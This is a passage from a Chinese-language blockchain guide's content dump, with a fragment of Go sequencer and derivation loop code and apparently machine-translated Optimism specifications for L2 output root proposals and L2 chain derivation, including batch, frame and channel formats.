sequencing but should be logged and metered.\n\t\t\t\tif err := s.network.PublishL2Payload(ctx, payload); err != nil {\n\t\t\t\t\ts.log.Warn(&quot;failed to publish newly created block&quot;, &quot;id&quot;, payload.ID(), &quot;err&quot;, err)\n\t\t\t\t\ts.metrics.RecordPublishingError()\n\t\t\t\t}\n\t\t\t}\n\t\t\tplanSequencerAction() // schedule the next sequencer action to keep the sequencing looping\n\t\tcase &lt;-altSyncTicker.C:\n\t\t\t// Check if there is a gap in the current unsafe payload queue.\n\t\t\tctx, cancel := context.WithTimeout(ctx, time.Second*2)\n\t\t\terr := s.checkForGapInUnsafeQueue(ctx)\n\t\t\tcancel()\n\t\t\tif err != nil {\n\t\t\t\ts.log.Warn(&quot;failed to check for unsafe L2 blocks to sync&quot;, &quot;err&quot;, err)\n\t\t\t}\n\t\tcase payload := &lt;-s.unsafeL2Payloads:\n\t\t\ts.snapshot(&quot;New unsafe payload&quot;)\n\t\t\ts.log.Info(&quot;Optimistically queueing unsafe L2 execution payload&quot;, &quot;id&quot;, payload.ID())\n\t\t\ts.derivation.AddUnsafePayload(payload)\n\t\t\ts.metrics.RecordReceivedUnsafePayload(payload)\n\t\t\treqStep()\n \n\t\tcase newL1Head := &lt;-s.l1HeadSig:\n\t\t\ts.l1State.HandleNewL1HeadBlock(newL1Head)\n\t\t\treqStep() // a new L1 head may mean we have the data to not get an EOF again.\n\t\tcase newL1Safe := &lt;-s.l1SafeSig:\n\t\t\ts.l1State.HandleNewL1SafeBlock(newL1Safe)\n\t\t\t// no step, justified L1 information does not do anything for L2 derivation or status\n\t\tcase newL1Finalized := &lt;-s.l1FinalizedSig:\n\t\t\ts.l1State.HandleNewL1FinalizedBlock(newL1Finalized)\n\t\t\ts.derivation.Finalize(newL1Finalized)\n\t\t\treqStep() // we may be able to mark more L2 data as finalized now\n\t\tcase &lt;-delayedStepReq:\n\t\t\tdelayedStepReq = nil\n\t\t\tstep()\n\t\tcase &lt;-stepReqCh:\n\t\t\ts.metrics.SetDerivationIdle(false)\n\t\t\ts.log.Debug(&quot;Derivation process step&quot;, &quot;onto_origin&quot;, s.derivation.Origin(), &quot;attempts&quot;, stepAttempts)\n\t\t\terr := s.derivation.Step(context.Background())\n\t\t\tstepAttempts += 1 // count as attempt by default. We reset to 0 if we are making healthy progress.\n\t\t\tif err == io.EOF {\n\t\t\t\ts.log.Debug(&quot;Derivation process went idle&quot;, &quot;progress&quot;, s.derivation.Origin())\n\t\t\t\tstepAttempts = 0\n\t\t\t\ts.metrics.SetDerivationIdle(true)\n\t\t\t\tcontinue\n\t\t\t} else if err != nil &amp;&amp; errors.Is(err, derive.ErrReset) {\n\t\t\t\t// If the pipeline corrupts, e.g. due to a reorg, simply reset it\n\t\t\t\ts.log.Warn(&quot;Derivation pipeline is reset&quot;, &quot;err&quot;, err)\n\t\t\t\ts.derivation.Reset()\n\t\t\t\ts.metrics.RecordPipelineReset()\n\t\t\t\tcontinue\n\t\t\t} else if err != nil &amp;&amp; errors.Is(err, derive.ErrTemporary) {\n\t\t\t\ts.log.Warn(&quot;Derivation process temporary error&quot;, &quot;attempts&quot;, stepAttempts, &quot;err&quot;, err)\n\t\t\t\treqStep()\n\t\t\t\tcontinue\n\t\t\t} else if err != nil &amp;&amp; errors.Is(err, derive.ErrCritical) {\n\t\t\t\ts.log.Error(&quot;Derivation process critical error&quot;, &quot;err&quot;, err)\n\t\t\t\treturn\n\t\t\t} else if err != nil &amp;&amp; errors.Is(err, derive.NotEnoughData) {\n\t\t\t\tstepAttempts = 0 // don&#039;t do a backoff for this error\n\t\t\t\treqStep()\n\t\t\t\tcontinue\n\t\t\t} else if err != nil {\n\t\t\t\ts.log.Error(&quot;Derivation process error&quot;, &quot;attempts&quot;, stepAttempts, &quot;err&quot;, err)\n\t\t\t\treqStep()\n\t\t\t\tcontinue\n\t\t\t} else {\n\t\t\t\tstepAttempts = 0\n\t\t\t\treqStep() // continue with the next step if we can\n\t\t\t}\n\t\tcase respCh := &lt;-s.stateReq:\n\t\t\trespCh &lt;- struct{}{}\n\t\tcase respCh := &lt;-s.forceReset:\n\t\t\ts.log.Warn(&quot;Derivation pipeline is manually reset&quot;)\n\t\t\ts.derivation.Reset()\n\t\t\ts.metrics.RecordPipelineReset()\n\t\t\tclose(respCh)\n\t\tcase resp := &lt;-s.startSequencer:\n\t\t\tunsafeHead := s.derivation.UnsafeL2Head().Hash\n\t\t\tif !s.driverConfig.SequencerStopped {\n\t\t\t\tresp.err &lt;- errors.New(&quot;sequencer already running&quot;)\n\t\t\t} else if !bytes.Equal(unsafeHead[:], resp.hash[:]) {\n\t\t\t\tresp.err &lt;- fmt.Errorf(&quot;block hash does not match: head %s, received %s&quot;, unsafeHead.String(), resp.hash.String())\n\t\t\t} else {\n\t\t\t\ts.log.Info(&quot;Sequencer has been started&quot;)\n\t\t\t\ts.driverConfig.SequencerStopped = false\n\t\t\t\tclose(resp.err)\n\t\t\t\tplanSequencerAction() // resume sequencing\n\t\t\t}\n\t\tcase respCh := &lt;-s.stopSequencer:\n\t\t\tif s.driverConfig.SequencerStopped {\n\t\t\t\trespCh &lt;- hashAndError{err: errors.New(&quot;sequencer not running&quot;)}\n\t\t\t} else {\n\t\t\t\ts.log.Warn(&quot;Sequencer has been stopped&quot;)\n\t\t\t\ts.driverConfig.SequencerStopped = true\n\t\t\t\trespCh &lt;- hashAndError{hash: s.derivation.UnsafeL2Head().Hash}\n\t\t\t}\n\t\tcase &lt;-s.done:\n\t\t\treturn\n}\n发布新创建的区块"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism-spec分析/op-L2-输出根提案规范":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism-spec分析/op-L2-输出根提案规范","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism spec分析/op-L2 输出根提案规范.md","title":"op-L2 输出根提案规范","links":[],"tags":[],"content":"L2 输出根提案规范\n目录\n\n提出 L2 产出承诺\n\nL2OutputOracle v1.0.0\nL2OutputOracle v2.0.0\n\n\nL2输出承诺构建\nL2输出预言机智能合约\n\n配置\n\n\n安全考虑\n\nL1 重组\n\n\n\n处理一个或多个区块后，输出需要与结算层 (L1) 同步，以便无需信任地执行 L2 到 L1 消息传递（例如提款）。这些输出建议充当桥接器进入 L2 状态的视图。被称为“提议者”的参与者将输出根提交到结算层（L1），并且可以通过故障证明进行争议，如果证明错误，则将面临风险。提议者的此类实现中的反对提议者。\n注意：目前尚未完全指定 Optimism 的故障证明。尽管在 Cannon 中实现了防错构造和验证，但防错游戏规范以及将输出根挑战者集成到汇总节点中 是后来规范里程碑的一部分。\n提出 L2 产出承诺\n提议者的角色是构建并提交输出根，即对 L2 状态的承诺，以及L2OutputOracleL1（结算层）上的合约。为此，提议者定期查询汇总节点以获取从最新 最终确定的L1 块派生的最新输出根。然后，它获取输出根并将其提交给L2OutputOracle结算层（L1）上的合约。\nL2OutputOracle v1.0.0\n输出提案的提交仅限于单个帐户。预计该帐户会随着时间的推移继续提交输出提案，以确保用户提款不会停止。\nL2 输出提议者预计会根据SUBMISSION_INTERVAL中的配置以确定性间隔提交输出根L2OutputOracle。越大SUBMISSION_INTERVAL，需要将 L1 交易发送到合约的频率就越低L2OutputOracle ，但 L2 用户需要等待更长的时间才能将输出根包含在 L1（结算层）中，其中包括他们从系统中提款的意图。\n诚实op-proposer算法假设与合约有连接，L2OutputOracle以了解与必须提交的下一个输出提案相对应的 L2 区块号。它还假设连接到op-node能够查询optimism_syncStatusRPC 端点的连接。\nimport time\n\nwhile True:\n    next_checkpoint_block = L2OutputOracle.nextBlockNumber()\n    rollup_status = op_node_client.sync_status()\n    if rollup_status.finalized_l2.number &gt;= next_checkpoint_block:\n        output = op_node_client.output_at_block(next_checkpoint_block)\n        tx = send_transaction(output)\n    time.sleep(poll_interval)\n\n一个账户可以通过调用该函数并指定要删除的第一个输出的索引来CHALLENGER删除多个输出根，这也将删除所有后续输出。deleteL2Outputs()\nL2OutputOracle v2.0.0\n产出提案的提交无需许可，并且没有必须提交产出提案的时间间隔。预计用户会“及时”提出输出提案，方便自己提现。必须与输出提案一起放置保证金，以抑制恶意输出的提案。如果可以通过故障证明或证明证明证明输出是恶意的，那么可以削减债券并将其用作支付给支付gas以消除恶意输出的用户的费用。\n仍可op-proposer用于提交输出提案。一个简单的实现 op-proposer将定期提交输出建议。然而，这不是必需的，其他提议者实现可以随时提交有效的输出。更理想的实现将使用启发式方法，例如上次提交的时间或尚未包含在输出提案中的待处理提款数量。\n该提议者的单次迭代（将一个输出根发布到 L1）如下所示：\n\n由于启用无需许可的输出提案时可能有多个提案者同时运行，因此反对者提案者将在发送提案交易之前检查其输出根是否尚未针对给定的 L2 区块号发布。Proposer 当查询L2OutputOracle输出根时，这如上面的序列图中所示。如果它接收到的输出根等于从汇总节点接收到的输出根，则它不会在事务中将此输出根发送到L2OutputOracle.\n另请注意，虽然op-proposer实现仅基于最终确定或安全的 L2 块提交输出，但其他提议者实现可能会提交与不安全（未最终确定）L2 块相对应的输出。这会带来风险，因为批处理程序可能会提交与已提供的输出不对应的 L2 块（意味着这些输出现在无效）。\n版本v2.0.0包括对 ABI 的重大更改L2OutputOracle。\nL2输出承诺构建\n这output_root是一个 32 字节的字符串，它是基于版本化方案派生的：\noutput_root = keccak256(version_byte || payload)\n在哪里：\n\nversion_byte( bytes32) 一个简单的版本字符串，只要输出根的构造发生更改，该版本字符串就会递增。\npayload( bytes) 是任意长度的字节串。\n\n在输出承诺构造的初始版本中，版本为bytes32(0)，有效负载定义为：\npayload = state_root || withdrawal_storage_root || latest_block_hash\n在哪里：\n\n( ) 是最新 L2 块的块哈希latest_block_hash。bytes32\n( state_root)是所有执行层账户的bytes32Merkle-Patricia-Trie ( MPT ) 根。该值被频繁使用，因此升高到更接近 L2 输出根，从而无需证明其包含在 的原像中latest_block_hash。这减少了 Merkle 证明的深度和访问 L1 上的 L2 状态根的成本。\n( withdrawal_storage_root)提升Message Passer 合约bytes32存储的Merkle-Patricia-Trie ( MPT ) 根。我们可以直接针对 L2toL1MessagePasser 的存储根进行证明，而不是针对状态根进行提款的 MPT 证明（首先针对状态根证明 L2toL1MessagePasser 的存储根，然后针对该存储根证明提款），从而减少验证L1 上的提款成本。\n\nL2输出预言机智能合约\nL2 块以恒定速率L2_BLOCK_TIME（2 秒）生成。必须将新的 L2 输出添加到链一次，每个SUBMISSION_INTERVAL链基于多个块。确切的数量尚未确定，并将取决于故障证明游戏的设计。\nL2输出预言机合约实现了以下接口：\n/**\n * @notice The number of the first L2 block recorded in this contract.\n */\nuint256 public startingBlockNumber;\n\n/**\n * @notice The timestamp of the first L2 block recorded in this contract.\n */\nuint256 public startingTimestamp;\n\n/**\n * @notice Accepts an L2 outputRoot and the timestamp of the corresponding L2 block. The\n * timestamp must be equal to the current value returned by `nextTimestamp()` in order to be\n * accepted.\n * This function may only be called by the Proposer.\n *\n * @param _l2Output      The L2 output of the checkpoint block.\n * @param _l2BlockNumber The L2 block number that resulted in _l2Output.\n * @param _l1Blockhash   A block hash which must be included in the current chain.\n * @param _l1BlockNumber The block number with the specified block hash.\n*/\n  function proposeL2Output(\n      bytes32 _l2Output,\n      uint256 _l2BlockNumber,\n      bytes32 _l1Blockhash,\n      uint256 _l1BlockNumber\n  )\n\n/**\n * @notice Deletes all output proposals after and including the proposal that corresponds to\n *         the given output index. Only the challenger address can delete outputs.\n *\n * @param _l2OutputIndex Index of the first L2 output to be deleted. All outputs after this\n *                       output will also be deleted.\n */\nfunction deleteL2Outputs(uint256 _l2OutputIndex) external\n\n/**\n * @notice Computes the block number of the next L2 block that needs to be checkpointed.\n */\nfunction nextBlockNumber() public view returns (uint256)\n\n配置\n必须startingBlockNumber至少是第一个基岩块的编号。必须startingTimestamp与起始块的时间戳相同。\n因此，第一个outputRoot提议将处于高度startingBlockNumber + SUBMISSION_INTERVAL\n安全考虑\nL1 重组\n如果 L1 在生成并提交输出后进行重组，则 L2 状态和正确输出可能会发生变化，从而导致错误的提案。通过允许提议者在附加新输出时向输出预言机提交 L1 块号和哈希值可以缓解这种情况；如果发生重组，块哈希将与具有该编号的块的哈希不匹配，并且调用将恢复。"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism-spec分析/op-L2链推导":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism-spec分析/op-L2链推导","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism spec分析/op-L2链推导.md","title":"op-L2链推导","links":[],"tags":[],"content":"L2 链推导规范\n目录\n\n概述\n\n渴望区块推导\n\n\n批量提交\n\n排序和批量提交概述\n批量提交电汇格式\n\n批处理交易格式\n帧格式\n频道格式\n批次格式\n\n\n\n\n建筑学\n\nL2链衍生管道\n\nL1遍历\nL1检索\n帧队列\n渠道银行\n\n修剪\n超时\n阅读\n加载帧\n\n\n通道读取器（批量解码）\n批量队列\n负载属性推导\n引擎队列\n\n引擎API使用\nForkchoice同步\nL1-consolidation：负载属性匹配\nL1-sync：有效负载属性处理\n处理不安全的有效负载属性\n\n\n重置管道\n\n寻找同步起点\n重置推导阶段\n关于合并后重组\n\n\n\n\n\n\n派生有效负载属性\n\n导出交易列表\n构建单独的有效负载属性\n\n\n\n概述\n\n请注意，以下内容假设单个定序器和批处理器。将来，该设计将进行调整以容纳多个此类实体。\n\nL2 链推导——从 L1 数据推导 L2区块——是rollup 节点的主要职责之一，无论是在验证器模式还是在排序器模式下（其中推导充当排序的健全性检查，并能够检测 L1 链重组））。\nL2链源自L1链。具体地，每个L1块被映射到包括多个L2块的L2排序时期。纪元号被定义为等于相应的L1区块号。\n为了导出 epoch 中的 L2 区块E，我们需要以下输入：\n\n\nepoch 的L1\n排序窗口\nE\n\n： 范围内的 L1 块，\n[E, E + SWS)\n\n其中\nSWS\n\n是排序窗口大小（请注意，这意味着 epoch 是重叠的）。特别是，我们需要：\n\n\n排序窗口中包含的\n批处理事务\n。这些允许我们重建包含要包含在 L2 块中的交易的\n定序器批次\n（每个批次包含 L2 块的列表）。\n\n请注意，批处理交易不可能包含与EL1 区块上的 纪元相关的批次E，因为该批次必须包含 L1 区块的哈希值E。\n\n\n\nL1 区块中的存款（以存款合约发出的E事件的形式）。\n\n\nL1区块属性来自L1区块E（以导出存入交易的L1属性）。\n\n\n\n\n纪元最后一个 L2 区块之后 L2 链的状态\nE - 1\n\n，或者（如果纪元\nE - 1\n\n不存在）\nL2 创世状态\n。\n\n如果L2 链起始点在哪里，则epochE不存在。E &lt;= L2CI``L2CI\n\n\n\n为了从头开始推导整个 L2 链，我们只需从L2 创世状态开始，并将L2 链起始作为第一个 epoch，然后按顺序处理所有排序窗口。有关我们如何在实践中实现这一点的更多信息，请参阅 架构部分。L2 链可能包含基岩前的历史，但这里的 L2 起源指的是第一个基岩 L2 区块。\n每个时期可能包含可变数量的 L2 块（每一个l2_block_time，乐观时为 2 秒），由 排序器自行决定，但每个块受到以下约束：\n\n\nmin_l2_timestamp &lt;= block.timestamp &lt;= max_l2_timestamp\n\n， 在哪里\n\n\n所有这些值均以秒为单位\n\n\nmin_l2_timestamp = l1_timestamp\n\n\n这可确保 L2 时间戳不落后于 L1 原始时间戳。\n\n\n\nblock.timestamp = prev_l2_timestamp + l2_block_time\n\n\nprev_l2_timestamp是上一个纪元的最后一个L2块的时间戳\nl2_block_time是 L2 块之间时间的可配置参数（乐观时为 2 秒）\n\n\n\nmax_l2_timestamp = max(l1_timestamp + max_sequencer_drift, min_l2_timestamp + l2_block_time)\n\n\nl1_timestamp是与 L2 区块纪元关联的 L1 区块的时间戳\nmax_sequencer_drift是排序器允许领先于 L1 的最大程度\n\n\n\n\n\n总而言之，这些约束意味着每秒必须有一个 L2 块l2_block_time，并且纪元的第一个 L2 块的时间戳绝不能落后于与该纪元匹配的 L1 块的时间戳。\n合并后，以太坊的固定出块时间为 12 秒（尽管可以跳过某些时隙）。因此，预计在 2 秒的 L2 区块时间下，大多数情况下，每个 epoch 将包含12/2 = 6L2 区块。然而，定序器可以延长或缩短纪元（受上述限制）。其基本原理是在 L1 上跳过时隙或暂时失去与 L1 的连接（这需要更长的 epoch）的情况下保持活跃性。然后需要更短的纪元来避免 L2 时间戳越来越领先于 L1。\n请注意，min_l2_timestamp + l2_block_time即使超出，也可确保始终可以处理新的 L2 批次 max_sequencer_drift。但是，当超过 时max_sequencer_drift，将强制执行到下一个 L1 源，但有一个例外，以确保在下一个 L2 批次中可以满足最小时间戳界限（基于下一个 L1 源），并且在超过时继续强制len(batch.transactions) == 0执行max_sequencer_drift。更多详情请参见[批处理队列]。\n渴望区块推导\n在实践中，通常不需要等待 L1 块的完整排序窗口就可以开始导出一个 epoch 中的 L2 块。事实上，只要我们能够重建连续的批次，我们就可以开始推导相应的 L2 块。我们称之为急切块派生。\n然而，在最坏的情况下，我们只能通过读取测序窗口的最后一个 L1 块来重建该纪元中第一个 L2 块的批次。当该批次的某些数据包含在窗口的最后一个 L1 块中时，就会发生这种情况。在这种情况下，我们不仅无法导出该纪元中的第一个 L2 块，而且在此之前我们也无法导出该纪元中的任何其他 L2 块，因为它们需要应用该纪元的第一个 L2 块所产生的状态。（请注意，这仅适用于块派生。批次仍然可以派生并暂时排队，我们只是无法从中创建块。）\n\n批量提交\n排序和批量提交概述\n排序器接受来自用户的 L2 事务。它负责构建这些块。对于每个这样的块，它还会创建一个相应的定序器批次。它还负责将每个批次提交给数据可用性提供者（例如以太坊calldata），这是通过其批处理程序组件完成的。\nL2 块和批处理之间的区别很微妙但很重要：块包含 L2 状态根，而批处理仅在给定的 L2 时间戳（相当于：L2 块号）提交事务。块还包括对前一个块的引用 (*)。\n(*) 这在某些边缘情况下很重要，其中会发生 L1 重组，并且批次将被重新发布到 L1 链，但不是前一个批次，而 L2 块的前身不可能改变。\n这意味着即使定序器错误地应用了状态转换，批次中的交易仍将被视为规范 L2 链的一部分。批次仍然需要接受有效性检查（即它们必须正确编码），批次内的各个交易也是如此（例如签名必须有效）。无效批次和有效批次中无效的单个交易将被正确的节点丢弃。\n如果定序器错误地应用状态转换并发布输出根，则该输出根将不正确。错误的输出根将受到故障证明的挑战，然后由现有定序器批次的正确输出根替换。\n有关更多信息，请参阅批量提交规范。\n批量提交电汇格式\n批量提交与 L2 链派生密切相关，因为派生过程必须对为了批量提交而编码的批次进行解码。\n批处理程序将批处理程序事务提交给数据可用性提供者。这些事务包含一个或多个通道帧，它们是属于某个通道的数据块。\n通道是压缩在一起的一系列定序器批次（对于任何 L2 块）。将多个批次分组在一起的原因很简单，就是为了获得更好的压缩率，从而降低数据可用性成本。\n通道可能太大而无法容纳单个批处理器事务，因此我们需要将其分成称为通道帧的块。单个批处理器事务还可以携带多个帧（属于相同或不同的通道）。\n这种设计为我们如何将批次聚合到通道以及如何通过批次事务拆分通道提供了最大的灵活性。它特别允许我们在批处理事务中最大化数据利用率：例如，它允许我们将窗口的最终（小）帧与下一个窗口的大帧打包。\n将来，这一通道识别功能还允许批处理程序使用多个签名者（私钥）并行提交一个或多个通道 (1)。\n(1) 这有助于缓解以下问题：由于交易随机数值影响 L2 交易池并因此包含在内：同一签名者进行的多个交易陷入等待包含先前交易的状态。\n另请注意，我们使用流压缩方案，并且当我们启动通道时，甚至当我们发送通道中的第一帧时，我们不需要知道通道最终将包含多少个块。\n通过跨多个数据事务分割通道，L2 可以拥有比数据可用性层可支持的更大的块数据。\n所有这些都如下图所示。解释如下。\n\n第一行代表 L1 块及其编号。L1 区块下方的方框代表区块内包含的批处理交易。L1 区块下方的波浪线代表 存款（更具体地说，是存款合约发出的事件）。\n框中的每个彩色块代表一个通道框架。所以A和B是 通道，而A0, A1, B0, B1,B2是帧。请注意：\n\n多个通道交错\n帧不需要按顺序传输\n单个批处理事务可以携带来自多个通道的帧\n\n在下一行中，圆形框代表从通道中提取的各个测序器批次。蓝色/紫色/粉色四种颜色来自通道A，其他颜色来自通道B。这些批次在这里按照它们从批次中解码的顺序表示（在本例中B是首先解码）。\n\n注意此处的标题显示“首先看到通道 B，并将首先将其解码为批次”，但这不是必需的。例如，对于一种实现来说，查看通道并首先解码包含最旧批次的通道同样是可以接受的。\n\n该图的其余部分在概念上与第一部分不同，并说明了通道重新排序后的 L2 链推导。\n第一行显示批处理交易。请注意，在这种情况下，存在批次排序，使得通道内的所有帧连续出现。一般来说，情况并非如此。A1例如，在第二笔交易中，和的位置B0可以颠倒以获得完全相同的结果 - 图中的其余部分不需要进行任何更改。\n第二行以正确的顺序显示重建的通道。第三行显示从通道中提取的批次。由于通道是有序的并且通道内的批次是连续的，这意味着批次也是有序的。第四行显示了从每个批次导出的L2 块。请注意，我们在这里有一个 1-1 批次到块的映射，但是，正如我们稍后将看到的，如果在 L1 上发布的批次中存在“间隙”，则可以插入未映射到批次的空块。\n第五行显示了L1 属性存入交易，该交易在每个 L2 区块内记录了与 L2 区块的纪元相匹配的 L1 区块的信息。第一个数字表示纪元/L1x 编号，而第二个数字（“序列号”）表示纪元内的位置。\n最后，第六行显示了前面提到的存款合约事件衍生的用户存款交易。\n请注意101-0该图右下角的 L1 属性事务。B2仅当帧指示它是通道内的最后一个帧并且(2) 不得插入空块时，它才可能存在。\n该图没有指定使用的排序窗口大小，但从中我们可以推断它必须至少为 4 个块，因为通道的最后一帧A出现在块 102 中，但属于 epoch 99。\n至于“安全类型”的注释，它解释了 L1 和 L2 上使用的块的分类。\n\n不安全的 L2 块：\n安全 L2 块：\n最终确定的 L2 块：指从最终确定的L1 数据导出的块。\n\n这些安全级别映射到与执行引擎 API交互时传输的headBlockHash、safeBlockHash和值。finalizedBlockHash\n批处理交易格式\n批处理事务被编码为version_byte ++ rollup_payload（其中++表示串联）。\n\n\n\n\n\n\n\n\n\n\n\n\n\nversion_byterollup_payload0frame ...（一帧或多帧，串联）\n未知版本使批处理器事务无效（必须被汇总节点忽略）。批处理事务中的所有帧都必须是可解析的。如果任何一帧无法解析，则事务中的所有帧都将被拒绝。\n通过验证交易to地址是否与批量收件箱地址匹配，以及该地址是否与读取交易数据的 L1 块时系统配置from中的批量发送者地址匹配，来对批量交易进行身份验证。\n帧格式\n通道帧编码为：\nframe = channel_id ++ frame_number ++ frame_data_length ++ frame_data ++ is_last\n \nchannel_id        = bytes16\nframe_number      = uint16\nframe_data_length = uint32\nframe_data        = bytes\nis_last           = bool\n其中uint32和uint16都是大端无符号整数。类型名称应根据Solidity ABI进行解释和编码。\n帧中的所有数据都是固定大小的，除了frame_data. 固定开销为16 + 2 + 4 + 1 = 23 bytes。固定大小的帧元数据避免了与目标总数据长度的循环依赖，以简化具有不同内容长度的帧的打包。\n在哪里：\n\nchannel_id是通道的不透明标识符。不宜重复使用，建议随机；但是，在超时规则之外，不会检查有效性\nframe_number标识通道内帧的索引\nframe_data_length是以字节为单位的长度frame_data。它的上限为 1,000,000 字节。\nframe_data是属于通道的字节序列，逻辑上位于前一帧的字节之后\nis_last是一个单字节，如果该帧是通道中的最后一个帧，则值为 1；如果通道中存在帧，则值为 0。任何其他值都会使帧无效（汇总节点必须忽略它）。\n\n频道格式\n通道编码为channel_encoding，定义为：\nrlp_batches = []\nfor batch in batches:\n    rlp_batches.append(batch)\nchannel_encoding = compress(rlp_batches)\n在哪里：\n\nbatches是输入，按照下一节（“批量编码”）进行字节编码的批次序列\nrlp_batches是 RLP 编码批次的串联\ncompress是一个执行压缩的函数，使用 ZLIB 算法（如RFC-1950中指定），没有字典\nchannel_encoding是压缩版本rlp_batches\n\n在解压缩通道时，我们将解压缩的数据量限制为MAX_RLP_BYTES_PER_CHANNEL（当前为 10,000,000 字节），以避免“zip-bomb”类型的攻击（其中小的压缩输入解压缩为巨大的数据量）。如果解压缩的数据超出限制，则处理过程就像通道仅包含第一个MAX_RLP_BYTES_PER_CHANNEL解压缩的字节一样。MAX_RLP_BYTES_PER_CHANNELRLP 解码设置了限制，因此即使通道的大小大于 ， 所有可以解码的批次也将被接受MAX_RLP_BYTES_PER_CHANNEL。确切的要求是length(input) &lt;= MAX_RLP_BYTES_PER_CHANNEL。\n虽然上述伪代码意味着所有批次都是预先已知的，但可以对 RLP 编码批次执行流式压缩和解压缩。这意味着在我们知道通道将包含多少个批次（以及多少个帧）之前，可以开始在 批处理器事务中包含通道帧。\n批次格式\n回想一下，批次包含要包含在特定 L2 块中的交易列表。\n批次编码为batch_version ++ content，其中content取决于batch_version：\n\n\n\n\n\n\n\n\n\n\n\n\n\nbatch_versioncontent0rlp_encode([parent_hash, epoch_number, epoch_hash, timestamp, transaction_list])\n在哪里：\n\nbatch_version是一个单字节，在 RLP 内容之前添加前缀，类似于事务类型。\nrlp_encode是一个根据RLP 格式对批次进行编码的函数，并[x, y, z]表示包含项目的列表x，y以及z\nparent_hash是前一个L2块的块哈希\nepoch_number和是与L2 区块的排序纪元epoch_hash对应的 L1 区块的编号和哈希值\ntimestamp是L2块的时间戳\ntransaction_list是EIP-2718编码交易的 RLP 编码列表。\n\n未知版本会使批次无效（汇总节点必须忽略它），格式错误的内容也是如此。\n和epoch_number还必须遵守“批处理队列”timestamp部分中列出的约束 ，否则该批处理将被视为无效并将被忽略。\n\n建筑学\n上面主要描述了L2链推导中使用的通用编码，主要是如何在批量交易中对批量进行编码。\n本节介绍如何使用管道架构从 L1 批次生成 L2 链。\n验证者可以以不同的方式实现这一点，但必须在语义上等效，以免偏离 L2 链。\nL2链衍生管道\n我们的架构将推导过程分解为由以下阶段组成的管道：\n\nL1遍历\nL1检索\n帧队列\n渠道银行\n通道读取器（批量解码）\n批量队列\n负载属性推导\n引擎队列\n\n数据从管道的起点（外部）流向终点（内部）。从最里面的阶段，数据是从最外面的阶段拉取的。\n然而，数据以相反的顺序*处理。*意思是如果最后一个阶段有数据要处理，就会先处理。处理按每个阶段可以采取的“步骤”进行。我们尝试在最后（最内部）阶段采取尽可能多的步骤，然后再在其外部阶段采取任何步骤，等等。\n这确保了我们在提取更多数据之前使用已有的数据，并最大限度地减少数据穿过派生管道的延迟。\n每个阶段都可以根据需要维持自己的内部状态。特别是，每个阶段都维护对最新 L1 块的 L1 块引用（数字 + 哈希），以便源自先前块的所有数据都已完全处理，并且来自该块的数据正在或已经被处理。这使得最里面的阶段能够最终确定用于生成 L2 链的 L1 数据可用性，从而在 L2 链输入变得不可逆时反映在 L2 链分叉选择中。\n让我们简要描述一下管道的每个阶段。\nL1遍历\n在L1遍历阶段，我们只需读取下一个L1块的头部。在正常操作中，这些在创建时将是新的 L1 块，尽管我们也可以在同步时读取旧块，或者在 L1重组的情况下读取旧块。\n遍历 L1 块时，L1 检索阶段使用的系统配置副本会更新，以便批量发送方身份验证始终准确到该阶段读取的确切 L1 块。\nL1检索\n在L1检索阶段，我们读取从外部阶段（L1遍历）获得的块，并从中提取数据。默认情况下，对于每个事务，汇总都会对从块中的批处理器事务中检索到的调用数据进行操作：\n\n接收者必须是配置的批处理程序收件箱地址。\n发送方必须匹配从系统配置加载的批处理地址，该地址与数据的 L1 块相匹配。\n\n每个数据事务都有版本控制，并包含一系列由帧队列读取的通道帧，请参阅批量提交线路格式。\n帧队列\n帧队列一次缓冲一个数据事务，解码为通道帧，供下一阶段使用。请参阅批处理程序事务格式和帧格式规范。\n渠道银行\n通道库阶段负责管理由 L1 检索阶段写入的通道库的缓冲。通道组阶段中的一个步骤尝试从“就绪”的通道读取数据。\n通道当前完全缓冲，直到读取或丢弃，ChannelBank 的未来版本可能会支持流通道。\n为了限制资源使用，通道库根据通道大小进行修剪，并使旧通道超时。\n通道按 FIFO 顺序记录在称为通道队列的结构中。当第一次看到属于该通道的帧时，该通道就会被添加到通道队列中。\n修剪\n成功插入新帧后，ChannelBank 会被修剪：通道按 FIFO 顺序丢弃，直到total_size &lt;= MAX_CHANNEL_BANK_SIZE，其中：\n\ntotal_size是每个通道的大小之和，即通道的所有缓冲帧数据的总和，以及200每帧字节的额外帧开销。\nMAX_CHANNEL_BANK_SIZE是 100,000,000 字节的协议常量。\n\n超时\n通道打开的 L1 原点通过通道 as 进行跟踪channel.open_l1_block，并确定在修剪之前保留通道数据的 L1 块的最大跨度。\n如果出现以下情况，则通道超时：current_l1_block.number &gt; channel.open_l1_block.number + CHANNEL_TIMEOUT，其中：\n\ncurrent_l1_block是舞台当前经过的 L1 原点。\nCHANNEL_TIMEOUT是可汇总配置的，以 L1 块的数量表示。\n\n超时通道的新帧将被丢弃而不是被缓冲。\n阅读\n通道组只能从第一个打开的通道输出数据。\n读取后，当第一个打开的通道超时时，将其从通道库中删除。\n一旦第一个打开的通道（如果有）未超时且准备就绪，就会读取该通道并将其从通道组中删除。\n如果满足以下条件，则通道已准备就绪：\n\n通道已关闭\n通道具有连续的帧序列，直到关闭帧\n\n如果没有通道准备就绪，则读取下一帧并将其摄取到通道组中。\n加载帧\n当帧引用的通道 ID 尚未存在于通道库中时，将打开一个新通道，用当前 L1 块进行标记，并将其附加到通道队列中。\n帧插入条件：\n\n与尚未从通道库中修剪的超时通道相匹配的新帧将被丢弃。\n尚未从通道库中修剪的帧的重复帧（按帧号）将被丢弃。\n重复的关闭（新框架is_last == 1，但通道已经看到关闭框架并且尚未从通道库中修剪）被丢弃。\n\n如果帧正在关闭 ( is_last == 1)，则任何现有的编号较高的帧都会从通道中删除。\n请注意，虽然这允许通道 ID 在从通道库中删除后可以重复使用，但建议批处理程序实现使用唯一的通道 ID。\n通道读取器（批量解码）\n在这个阶段，我们解压缩从最后一个阶段拉出的通道，然后 从解压缩的字节流中解析批次。\n有关解压缩和解码规范，请参阅批处理格式。\n批量队列\n在批量缓冲阶段，我们按时间戳对批次重新排序。如果某些时间段缺少批次，并且存在具有较高时间戳的有效批次，则此阶段还会生成空批次来填补空白。\n只要有一个连续批次直接跟在当前安全 L2 头（可以从规范 L1 